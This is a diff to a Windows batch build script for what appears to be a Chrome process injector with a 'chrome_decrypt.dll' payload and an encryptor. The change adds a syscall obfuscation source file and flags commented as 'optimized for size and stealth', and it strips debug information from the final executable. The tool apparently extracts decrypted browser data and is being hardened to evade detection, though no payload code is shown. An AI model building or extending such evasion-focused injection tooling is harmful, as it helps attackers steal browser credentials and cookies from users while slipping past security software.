@@ -12,10 +12,11 @@ set "PAYLOAD_DLL_NAME=chrome_decrypt.dll"
 set "ENCRYPTOR_EXE_NAME=encryptor.exe"
 set "VERBOSE=1"
 
-:: Compiler and Linker Flags
-set "CFLAGS_COMMON=/nologo /W3 /O2 /MT /GS-"
+:: Compiler and Linker Flags (Optimized for size and stealth)
+set "CFLAGS_COMMON=/nologo /W3 /O1 /MT /GS- /Gy /GL"
 set "CFLAGS_CPP_ONLY=/EHsc /std:c++17"
-set "LFLAGS_COMMON=/link /NOLOGO /DYNAMICBASE /NXCOMPAT"
+set "LFLAGS_COMMON=/link /NOLOGO /LTCG /OPT:REF /OPT:ICF /DYNAMICBASE /NXCOMPAT /EMITPOGOPHASEINFO"
+set "LFLAGS_STRIP=/PDBALTPATH:none /NOCOFFGRPINFO"
 
 :: =============================================================================
 :: =                                  COLORS                                   =
@@ -238,10 +239,16 @@ goto :eof
     set "CMD_COMPILE_INJECTOR_SRC=cl %CFLAGS_COMMON% %CFLAGS_CPP_ONLY% /I%LIBS_DIR%\chacha /c %SRC_DIR%\chrome_inject.cpp /Fo"%BUILD_DIR%\chrome_inject.obj""
     call :run_command "!CMD_COMPILE_INJECTOR_SRC!" "  - Compiling C++ source (chrome_inject.cpp)..."
     if %errorlevel% neq 0 exit /b 1
+    
     set "CMD_COMPILE_SYSCALLS_SRC=cl %CFLAGS_COMMON% %CFLAGS_CPP_ONLY% /c %SRC_DIR%\syscalls.cpp /Fo"%BUILD_DIR%\syscalls.obj""
     call :run_command "!CMD_COMPILE_SYSCALLS_SRC!" "  - Compiling C++ source (syscalls.cpp)..."
     if %errorlevel% neq 0 exit /b 1
-    set "CMD_LINK_FINAL=cl %CFLAGS_COMMON% %CFLAGS_CPP_ONLY% "%BUILD_DIR%\chrome_inject.obj" "%BUILD_DIR%\syscalls.obj" !TRAMPOLINE_OBJ! "%BUILD_DIR%\resource.res" version.lib shell32.lib %LFLAGS_COMMON% /OUT:".\%FINAL_EXE_NAME%""
+    
+    set "CMD_COMPILE_OBFUSCATION_SRC=cl %CFLAGS_COMMON% %CFLAGS_CPP_ONLY% /c %SRC_DIR%\syscalls_obfuscation.cpp /Fo"%BUILD_DIR%\syscalls_obfuscation.obj""
+    call :run_command "!CMD_COMPILE_OBFUSCATION_SRC!" "  - Compiling C++ source (syscalls_obfuscation.cpp)..."
+    if %errorlevel% neq 0 exit /b 1
+    
+    set "CMD_LINK_FINAL=cl %CFLAGS_COMMON% %CFLAGS_CPP_ONLY% "%BUILD_DIR%\chrome_inject.obj" "%BUILD_DIR%\syscalls.obj" "%BUILD_DIR%\syscalls_obfuscation.obj" !TRAMPOLINE_OBJ! "%BUILD_DIR%\resource.res" version.lib shell32.lib %LFLAGS_COMMON% %LFLAGS_STRIP% /OUT:".\%FINAL_EXE_NAME%""
     call :run_command "!CMD_LINK_FINAL!" "  - Linking final executable..."
     if %errorlevel% neq 0 exit /b 1
     call :log_success "Final injector built successfully."
